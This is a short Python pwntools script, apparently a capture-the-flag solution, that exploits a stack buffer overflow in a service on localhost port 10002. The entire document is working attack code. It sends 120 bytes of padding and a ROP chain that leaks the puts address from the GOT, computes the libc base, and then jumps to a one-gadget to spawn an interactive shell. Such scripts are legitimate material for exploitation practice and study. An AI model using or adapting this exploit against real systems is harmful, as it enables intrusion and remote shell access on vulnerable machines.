from pwn import *

host = 'localhost'
port = 10002

s = remote(host, port)
libc = ELF("./libc.so.6")

context.arch = "amd64"

main = 0x4006fb
puts_plt = 0x400560
puts_got = 0x601018
pop_rdi = 0x4007a3

payload = b'a' * 120
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

s.recvuntil('?\n')
s.sendline(payload)
libc_base = u64(s.recvline()[:6].ljust(8, b'\x00')) - libc.sym.puts
print (f'libc base: {hex(libc_base)}')

gadget = 0x10a38c
payload = b'a' * 120
payload += p64(libc_base + gadget)
s.recvuntil('?\n')
s.sendline(payload)
s.interactive()


